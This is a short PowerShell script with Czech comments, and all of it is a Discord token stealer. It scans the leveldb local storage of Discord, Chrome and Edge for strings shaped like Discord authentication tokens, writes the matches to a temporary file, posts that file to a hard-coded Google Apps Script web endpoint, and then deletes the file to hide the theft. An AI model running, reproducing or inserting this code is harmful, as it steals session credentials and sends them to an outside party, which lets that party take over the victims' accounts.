# Cesty k úložištím tokenů
$tokenPaths = @(
    "$env:APPDATA\Discord\Local Storage\leveldb\",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb\",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb\"
)

# Regex pro nalezení tokenu
$tokenPattern = '[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
$tokenFound = $false
$tokenData = ""

foreach ($path in $tokenPaths) {
    if (Test-Path $path) {
        $files = Get-ChildItem -Path $path -Filter "*.ldb" -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            $content = Get-Content -Path $file.FullName -Raw -ErrorAction SilentlyContinue
            $matches = [regex]::Matches($content, $tokenPattern)
            foreach ($match in $matches) {
                if ($match.Value) {
                    $tokenData += "$($match.Value)`n"
                    $tokenFound = $true
                }
            }
        }
    }
}

if ($tokenFound) {
    # Vytvoření dočasného souboru
    $tempFile = "$env:TEMP\discord_token.txt"
    $tokenData | Out-File -FilePath $tempFile

    # Odeslání na Google Drive přes Apps Script API
    $uploadUrl = "https://script.google.com/macros/s/AKfycbwPEGLtKagBG4W1G2pfa2AXgOeuGazERAq_MiArNAUrX4fXwtwvZa0k5ih9kYIHXYdo/exec"
    Invoke-RestMethod -Uri $uploadUrl -Method Post -InFile $tempFile -ContentType "text/plain"

    # Odstranění souboru po nahrání
    Remove-Item $tempFile
}

